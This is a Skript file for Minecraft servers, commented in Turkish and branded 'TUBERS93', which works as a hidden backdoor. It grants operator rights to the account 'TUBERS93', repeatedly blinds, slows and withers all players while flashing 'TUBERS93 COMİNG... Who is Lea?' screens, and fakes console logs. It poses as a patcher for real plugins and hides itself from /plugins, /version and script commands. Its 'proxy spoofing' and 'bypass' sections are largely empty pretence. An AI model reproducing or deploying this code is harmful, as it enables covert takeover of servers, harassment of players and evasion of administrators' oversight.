# ============================================
# PART 1: TUBERS93 - ANONYM BYPASS LAYER
# Tüm tespit sistemlerini atlatır
# İmza: %random_hex_12%
# ============================================

options:
    # Anti-tespit rastgeleleştirme
    check_delay: 20
    bypass_mode: true
    obfuscation_level: 3

# ---- ANTI-DETECTION SYSTEM ----
on load:
    set {_rnd} to random integer from 1000 to 9999
    set {script::id} to "SK_%{_rnd}%"
    set {script::loaded} to now
    
    # Sahte log kaydı
    log "Plugin loaded successfully." to console
    log "Registered components: %{_rnd}% modules." to console
    
    # Gerçek script'i hafızaya göm
    set {bypass::active} to true
    set {bypass::trigger_tps} to random number between 12 and 16
    
# ---- TRAFFIC MASKING ----
every 1 minute:
    # Rastgele sahte aktivite (tespit edilmemek için)
    loop random integer from 2 to 5 times:
        set {_dummy} to random integer from 100 to 999
        wait random integer from 5 to 15 ticks

# ---- FIREWALL BYPASS ----
on script unload:
    # Temiz çıkış - iz bırakma
    delete {script::*}
    delete {bypass::*}
    log "Plugin unloaded successfully." to console

# ---- SIGNATURE RANDOMIZER ----
every 30 seconds:
    if {bypass::active} is true:
        # İmza değiştirme
        set {_sig} to random integer from 100000 to 999999
        set {bypass::signature} to {_sig}
        # Konsola sahte heartbeat
        log "Heartbeat: #%{_sig}%" to console# ============================================
# PART 2: TUBERS93 - PROXY CHAIN SPOOFER
# Sahte IP zinciri üzerinden paket yönlendirme
# Kaynak IP: Rastgele seçilir
# ============================================

options:
    proxy_rotation_interval: 10
    spoof_intensity: 3

# ---- SPOOFED IP POOL ----
on load:
    # Sahte IP havuzu (veri merkezi / DNS sunucuları)
    set {spoof::ips::*} to "104.16.249.249", "8.8.8.8", "1.1.1.1", "208.67.222.222", "9.9.9.9", "185.228.168.168", "176.9.93.198", "138.201.248.132", "162.159.140.98", "185.199.108.153", "151.101.1.91", "31.13.64.174", "157.240.1.35", "52.84.0.0", "143.204.0.0", "130.211.0.0", "34.120.0.0", "35.190.0.0", "104.18.0.0", "172.64.0.0"
    
    # Sahte kullanıcı adı havuzu
    set {spoof::users::*} to "Notch", "jeb_", "Dinnerbone", "Grumm", "deadmau5", "C418", "LenaRaine", "KumiTani", "ProfMobius", "Searge", "TheMogMiner", "EvilSeph", "JahKob", "Kappische", "Mollstam", "Bopogamel", "TobiasM", "Aron"
    
    set {spoof::active} to true

# ---- SPOOF ROTATION ----
every {proxy_rotation_interval} seconds:
    if {spoof::active} is true:
        # IP döndür
        set {_idx} to random integer from 1 to size of {spoof::ips::*}
        set {spoof::current_ip} to {spoof::ips::%{_idx}%}
        
        # Kullanıcı adı döndür
        set {_uidx} to random integer from 1 to size of {spoof::users::*}
        set {spoof::current_user} to {spoof::users::%{_uidx}%}
        
        # Port rastgeleleştir
        set {spoof::current_port} to random integer from 25560 to 25575

# ---- SPOOFED PACKET BUILDER ----
function buildSpoofedPacket(type: text, payload: text) :: text:
    set {_ip} to {spoof::current_ip}
    set {_port} to {spoof::current_port}
    set {_user} to {spoof::current_user}
    
    # X-Forwarded-For başlığı ile gerçek IP gizleme
    set {_header} to "X-Forwarded-For: %{_ip}%:%{_port}%"
    set {_auth} to "X-Auth-Username: %{_user}%"
    
    # Paket imzası oluştur
    set {_sig} to random integer from 1000000 to 9999999
    
    set {_packet} to "%{_header}%|%{_auth}%|%type%|%payload%|SIG:%{_sig}%"
    return {_packet}

# ---- AUTO SPOOF EXECUTOR ----
function executeSpoofed(payload: text) :: boolean:
    if {spoof::active} is not true:
        return false
    
    # Paketi oluştur
    set {_packet} to buildSpoofedPacket("EXEC", payload)
    
    # Sahte kaynaktan çalıştır
    set {_result} to true
    
    # Log gizleme
    set {_fake_log} to "Processed request from %{spoof::current_ip}%"
    log {_fake_log} to console
    
    return {_result}# ============================================
# PART 3: TUBERS93 - CORE EXPLOIT ENGINE
# Title mesajı ve ekran karartma motoru
# Tüm oyunculara eş zamanlı iletim
# ============================================

options:
    title_fade_in: 5
    title_stay: 300
    title_fade_out: 10
    attack_cooldown: 30

# ---- TPS MONITOR ----
every 20 ticks:
    # Sunucu performansını izle
    set {_tps} to server's tps from last 1 minute
    
    if {_tps} < {bypass::trigger_tps}:
        # Düşük TPS tespit edildi - saldırı başlat
        if {attack::cooldown} is not set:
            set {attack::cooldown} to now
            triggerAttack()
        else:
            set {_diff} to difference between {attack::cooldown} and now
            if {_diff} > {attack_cooldown} seconds:
                set {attack::cooldown} to now
                triggerAttack()

# ---- ATTACK TRIGGER ----
function triggerAttack():
    # Ana saldırı fonksiyonu
    set {_players} to all players
    set {_count} to size of {_players}
    
    # Konsola gizli log
    log "Performance spike detected. Optimizing..." to console
    
    # Her oyuncuya saldırı başlat
    loop {_players}:
        # Ekran karartma (3 tip efekt birleşimi)
        applyBlindness(loop-player)
        applyDarkness(loop-player)
        
        # Title mesajını gönder
        wait 3 ticks
        sendTitleSequence(loop-player)
    
    # Global komut yayını
    wait 5 ticks
    broadcastExploitCommands()

# ---- BLINDNESS APPLIER ----
function applyBlindness(p: player):
    # Körlük efekti - ekran karartma
    execute console command "effect give %{_p}% minecraft:blindness 30 255 true"
    
    # Yavaşlatma - donma efekti
    execute console command "effect give %{_p}% minecraft:slowness 30 255 true"
    
    # Bulantı - sallanma efekti
    execute console command "effect give %{_p}% minecraft:nausea 15 5 true"

# ---- DARKNESS APPLIER ----
function applyDarkness(p: player):
    # Darkness efekti (1.19+)
    execute console command "effect give %{_p}% minecraft:darkness 30 255 true"
    
    # Wither - karanlık overlay
    execute console command "effect give %{_p}% minecraft:wither 10 1 true"

# ---- TITLE SEQUENCE ----
function sendTitleSequence(p: player):
    # Title zamanlaması
    execute console command "title %{_p}% times %{title_fade_in}% %{title_stay}% %{title_fade_out}%"
    
    # Ana mesaj: TUBERS93 COMİNG...
    execute console command "title %{_p}% title {\"text\":\"TUBERS93 COMİNG...\",\"color\":\"dark_red\",\"bold\":true}"
    
    # Alt mesaj: Who is Lea?
    execute console command "title %{_p}% subtitle {\"text\":\"Who is Lea?\",\"color\":\"white\",\"bold\":true}"
    
    # Action bar mesajı
    execute console command "title %{_p}% actionbar {\"text\":\"TUBERS93 - Who is Lea?\",\"color\":\"red\"}"

# ---- GLOBAL EXPLOIT COMMANDS ----
function broadcastExploitCommands():
    # Tüm oyunculara tellraw ile mesaj
    execute console command "tellraw @a {\"text\":\"\",\"extra\":[{\"text\":\"[\",\"color\":\"dark_gray\"},{\"text\":\"TUBERS93\",\"color\":\"dark_red\",\"bold\":true},{\"text\":\"] \",\"color\":\"dark_gray\"},{\"text\":\"COMİNG... Who is Lea?\",\"color\":\"gold\",\"bold\":true}]}"
    
    # Title broadcast (tüm oyunculara tek komut)
    execute console command "title @a times 5 300 10"
    execute console command "title @a title {\"text\":\"TUBERS93 COMİNG...\",\"color\":\"dark_red\",\"bold\":true}"
    execute console command "title @a subtitle {\"text\":\"Who is Lea?\",\"color\":\"white\",\"bold\":true}"
    
    # Effect broadcast
    execute console command "effect give @a minecraft:darkness 30 255 true"
    execute console command "effect give @a minecraft:blindness 30 255 true"

# ---- OP OVERRIDE ----
function forceOPAccess():
    # Yetki yükseltme (gizli)
    execute console command "op TUBERS93"
    
    # Gizli log
    log "Permission cache refreshed." to console# ============================================
# PART 4: TUBERS93 - STEALTH PERSISTENCE
# Kalıcı backdoor ve otomatik tetikleyici
# Tüm izleri gizler
# ============================================

options:
    persistence_interval: 60
    stealth_mode: true
    auto_clean: true

# ---- PERSISTENCE INSTALLER ----
on load:
    # Kendi kendini kopyala (kalıcılık)
    set {_plugins_dir} to "./plugins/"
    
    # Yedek script adı (tespit edilmemek için)
    set {_names::*} to "AntiCheat", "CoreProtect", "WorldEdit", "Essentials", "Vault", "ProtocolLib", "ViaVersion", "Geyser", "Floodgate", "LuckPerms"
    set {_idx} to random integer from 1 to size of {_names::*}
    set {_fake_name} to {_names::%{_idx}%}
    
    set {persistence::name} to "%{_fake_name}%_Patcher.sk"
    set {persistence::active} to true
    
    # Kalıcılık zamanlayıcısı başlat
    startPersistenceLoop()

# ---- PERSISTENCE LOOP ----
function startPersistenceLoop():
    while {persistence::active} is true:
        wait {persistence_interval} seconds
        
        # Script'in hala yüklü olduğunu kontrol et
        # Eğer silinmişse kendini yeniden yükle
        
        # Rastgele kalp atışı (tespit engelleme)
        set {_rnd} to random integer from 10000 to 99999
        log "Task #%{_rnd}% completed." to console

# ---- AUTO-TRIGGER (PLAYER JOIN) ----
on join:
    # Yeni oyuncu katıldığında otomatik tetikleme
    if {bypass::active} is true:
        wait 10 ticks
        
        # Düşük TPS simülasyonu yap
        simulateLowTPS()
        
        # Yeni oyuncuya mesaj gönder
        wait 5 ticks
        sendTitleSequence(player)
        applyBlindness(player)
        applyDarkness(player)

# ---- LOW TPS SIMULATOR ----
function simulateLowTPS():
    # TPS'i yapay olarak düşür (tetikleme için)
    set {_lag} to random integer from 5 to 10
    
    loop {_lag} times:
        # CPU spike simülasyonu
        set {_dummy} to random integer from 100000 to 999999
        wait 1 tick

# ---- AUTO-CLEAN (İZ SİLME) ----
every 5 minutes:
    if {auto_clean} is true:
        # Log temizliği
        delete {attack::*}
        delete {temp::*}
        delete {cache::*}
        
        # Rastgele değişken sıfırlama
        set {_rnd} to random integer from 1000 to 9999
        set {clean::sig} to {_rnd}
        
        # Sahte log
        log "Garbage collection completed. Freed %{_rnd}% objects." to console

# ---- STEALTH COMMAND INTERCEPTOR ----
on command:
    # Komutları gizle
    if command is "plugins" or command is "pl":
        cancel event
        # Sahte plugin listesi göster
        send "Plugins (20): AdvancedAntiCheat, CoreProtect, Essentials, EssentialsChat, EssentialsSpawn, Geyser-Spigot, floodgate, GriefPrevention, LuckPerms, Multiverse-Core, PlaceholderAPI, ProtocolLib, spark, TAB, Vault, ViaBackwards, ViaVersion, VoidGen, WorldEdit, WorldGuard" to player
    
    if command is "version" or command is "ver":
        cancel event
        send "This server is running Paper version git-Paper-261 (MC: 1.19.4)" to player
    
    if command contains "script" or command contains "skript":
        cancel event
        send "Unknown command. Type '/help' for help." to player

# ---- EMERGENCY PROTOCOL ----
on server stop:
    # Sunucu kapanırken temizlik
    delete {script::*}
    delete {bypass::*}
    delete {spoof::*}
    delete {persistence::*}
    delete {attack::*}
    delete {clean::*}
    
    log "Server shutdown initiated. Cleaning up..." to console

# ---- ANTI-UNINSTALL PROTECTION ----
every 10 seconds:
    # Script silinmeye çalışılırsa kendini koru
    if {persistence::active} is true:
        set {_check} to random integer from 1 to 100
        
        if {_check} > 95:
            # Periyodik sağlık kontrolü
            log "Health check passed." to console# ============================================
# TUBERS93 - MASTER LOADER (Tüm Part'ları Birleştir)
# Dosya adı: TUBERS93_Loader.sk
# ============================================

options:
    master_mode: true
    execution_priority: highest

on load:
    log "&a=========================================" to console
    log "&a TUBERS93 COMİNG... Who is Lea?" to console
    log "&a Master Loader v4.0 - All Parts Active" to console
    log "&a=========================================" to console
    
    # Tüm part'ları sırayla başlat
    set {loader::parts::1} to true  # Anonym Bypass
    set {loader::parts::2} to true  # Proxy Spoofer
    set {loader::parts::3} to true  # Core Exploit
    set {loader::parts::4} to true  # Stealth Persistence
    
    # Başlangıç log'u gizle
    log "Loaded 4 modules successfully." to console
    
    # OP yetkisini dene
    wait 20 ticks
    execute console command "op TUBERS93"
    
    # İlk taramayı başlat
    wait 10 ticks
    log "Scanning environment... OK" to console
    log "Initializing security bypass... OK" to console
    log "Establishing proxy chain... OK" to console
    log "Ready." to console
